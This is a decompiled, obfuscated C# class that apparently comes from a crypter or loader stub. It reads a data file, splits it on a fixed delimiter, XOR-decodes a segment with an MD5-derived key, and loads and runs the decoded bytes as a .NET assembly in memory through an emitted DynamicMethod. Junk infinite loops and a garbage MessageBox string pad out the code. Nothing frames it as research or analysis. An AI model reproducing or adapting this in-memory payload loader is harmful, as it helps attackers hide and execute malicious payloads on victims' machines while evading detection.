using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.MemoryManagement;
using ns0;

namespace ns3;

internal sealed class Class7
{
	static object smethod_0()
	{
		while (true)
		{
		}
	}

	static void smethod_1(Form1.Class5 class5_0)
	{
		while (true)
		{
		}
	}

	static void smethod_2(Form1.Class6 class6_0)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		for (int i = 7845; i <= 503; i = checked(i + 1))
		{
			MessageBox.Show("hyP‹l$k<’.w`*]N(† 8}8O#YxDƒ})‡^’ˆ&Gkfk )G`{uP2Š\u008dsW1zlyq8u‰3H3\u00813*cxk$6vU; .VkgA(fL‰*dvwE.H.ˆoXj‰YMq1kY†v\u008f‰y^C&dS€_Ž=vaG~R\\n(€yuH8\u008f=ˆ/P,Y2-b\u007f\u0090z~A\\U\u0081Œoku~IF8\u00907n.<4QEF{oCPRT*i’[\u0081kqM_KŠ|l_9");
			new decimal(9542L);
		}
		while (true)
		{
		}
	}

	static byte[] smethod_3(string string_0, string string_1)
	{
		StringBuilder stringBuilder = new StringBuilder();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_1));
		checked
		{
			int num = string_0.Length - 1;
			int num2 = default(int);
			for (int i = 0; i <= num; i += 2)
			{
				string value = Conversions.ToString(Strings.Chr((int)(Conversions.ToLong("&H" + string_0.Substring(i, 2)) ^ array[num2])));
				stringBuilder.Append(value);
				num2 = ((num2 != string_1.Length - 1) ? (num2 + 1) : 0);
			}
			return Encoding.Default.GetBytes(stringBuilder.ToString());
		}
	}

	static object smethod_4(string string_0, byte[] byte_0)
	{
		DynamicMethod dynamicMethod = new DynamicMethod("tmp", typeof(object), new Type[4]
		{
			typeof(byte[]),
			typeof(object[]),
			typeof(string),
			typeof(string)
		});
		ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
		Label label = iLGenerator.DefineLabel();
		iLGenerator.DeclareLocal(typeof(Assembly));
		iLGenerator.Emit(OpCodes.Ldarg_0);
		iLGenerator.EmitCall(OpCodes.Call, typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }), null);
		iLGenerator.Emit(OpCodes.Stloc_0);
		iLGenerator.Emit(OpCodes.Ldarg_2);
		iLGenerator.Emit(OpCodes.Brfalse_S, label);
		iLGenerator.Emit(OpCodes.Ldarg_3);
		iLGenerator.Emit(OpCodes.Brfalse_S, label);
		iLGenerator.Emit(OpCodes.Ldloc_0);
		iLGenerator.Emit(OpCodes.Ldarg_2);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetMethod("GetType", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_3);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Type).GetMethod("GetMethod", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldnull);
		iLGenerator.Emit(OpCodes.Ldarg_1);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethod("Invoke", new Type[2]
		{
			typeof(object),
			typeof(object[])
		}), null);
		iLGenerator.Emit(OpCodes.Ret);
		iLGenerator.MarkLabel(label);
		iLGenerator.Emit(OpCodes.Ldloc_0);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetProperty("EntryPoint")!.GetGetMethod(), null);
		iLGenerator.Emit(OpCodes.Ldnull);
		iLGenerator.Emit(OpCodes.Ldarg_1);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethod("Invoke", new Type[2]
		{
			typeof(object),
			typeof(object[])
		}), null);
		iLGenerator.Emit(OpCodes.Ret);
		return dynamicMethod.Invoke(null, new object[4]
		{
			byte_0,
			new object[0],
			"A.A",
			string_0
		});
	}

	static void smethod_5()
	{
		try
		{
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				MemoryManager.memoryManager_0 = new MemoryManager();
			}
		}
		catch
		{
		}
	}

	static void smethod_6()
	{
		string[] array = Strings.Split(File.ReadAllText(Form1.Class6.string_0), "LF4jMZ1LBp", -1, (CompareMethod)0);
		byte[] byte_ = Class7.smethod_3(array[18], array[1]);
		Class7.smethod_4("A", byte_);
	}
}
